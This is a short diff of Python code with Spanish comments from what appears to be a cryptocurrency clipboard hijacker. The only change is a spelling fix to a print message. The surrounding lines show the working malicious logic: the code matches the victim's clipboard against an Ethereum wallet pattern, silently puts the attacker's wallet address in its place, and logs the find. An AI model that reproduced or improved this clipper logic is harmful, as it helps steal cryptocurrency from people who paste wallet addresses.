@@ -65,7 +65,7 @@ mi_patron_eth = re.compile(settings.patron_wallet_eth)
 #3 => Comparar portapapeles con reglas de ETH
 if mi_patron_eth.match(victima_portapapeles):
     pc.copy(settings.atacante_wallet_eth)
-    print("🚨 Encontrando Wallet Ethereum Remplazando... 😈")
+    print("🚨 Encontrado Wallet Ethereum Remplazando... 😈")
     loguear_hallazgo(victima_portapapeles, "wallet ETH")
 
 #1 => Revisar el portapapeles
